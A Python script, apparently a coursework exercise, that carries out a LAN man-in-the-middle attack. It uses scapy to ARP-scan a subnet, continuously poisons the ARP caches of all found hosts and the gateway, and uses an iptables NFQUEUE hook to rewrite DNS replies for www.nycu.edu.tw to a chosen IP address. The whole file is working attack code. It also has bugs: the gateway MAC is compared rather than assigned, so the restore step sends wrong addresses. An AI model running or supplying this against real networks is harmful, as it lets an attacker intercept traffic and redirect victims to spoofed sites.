#!/usr/bin/env python3
from tabnanny import verbose
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import os
from time import sleep
import netifaces
import threading

def enable_ipv4_forwarding():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ipv4_forwarding():
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def get_gateway_ip():
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]

def scanner():
    target_ip = "192.168.218.1/24"
    gateway_ip = get_gateway_ip()
    arp = scapy.ARP(pdst=target_ip)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = scapy.srp(packet, timeout=3, verbose=0)[0]
    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("Available devices:")
    print("-------------------------------------")
    print("IP" + " "*18+"MAC")
    print("-------------------------------------")
    gateway_mac = None
    gateway_index = 0
    for i in range(len(clients)):
        if clients[i]['ip'] == gateway_ip:
            gateway_mac == clients[i]['mac']
            gateway_index = i
        else:
            print("{:16}    {}".format(clients[i]['ip'], clients[i]['mac']))
    del clients[gateway_index]
    return gateway_ip, gateway_mac, clients

def spoofed_send(source_ip, dst_ip):
    packet = scapy.ARP(op=2, pdst=dst_ip, psrc=source_ip, hwdst=scapy.Ether().src)
    scapy.send(packet, verbose=False)

def restore(source_ip, dst_ip, source_mac, dst_mac):
    packet = scapy.ARP(op=2, pdst=dst_ip, psrc=source_ip, hwdst=dst_mac, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def arp_spoofer(gateway_ip, gateway_mac, targets):
    try:
        while True:
            for target in targets:
                spoofed_send(target['ip'], gateway_ip)
                spoofed_send(gateway_ip, target['ip'])  
                # print('Spoofed packets sent.')  
            sleep(0.1)
    except KeyboardInterrupt:
        print('Keyboard interruptted')
        for target in targets:
            restore(target['ip'], gateway_ip, target['mac'], gateway_mac)
            restore(gateway_ip, target['ip'], target['mac'], gateway_mac)  

def pharming_attack():
    QUEUE_NUM = 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
    finally:
        os.system("iptables --flush")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if b'www.nycu.edu.tw' in qname:
            answer = scapy.DNSRR(rrname=qname, rdata='140.113.207.237')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(bytes(scapy_packet))
    packet.accept()
    
enable_ipv4_forwarding()
gateway_ip, gateway_mac, targets = scanner()
thread = threading.Thread(target = arp_spoofer, args = (gateway_ip, gateway_mac, targets, ), daemon = True)
thread.start()
pharming_attack()
disable_ipv4_forwarding()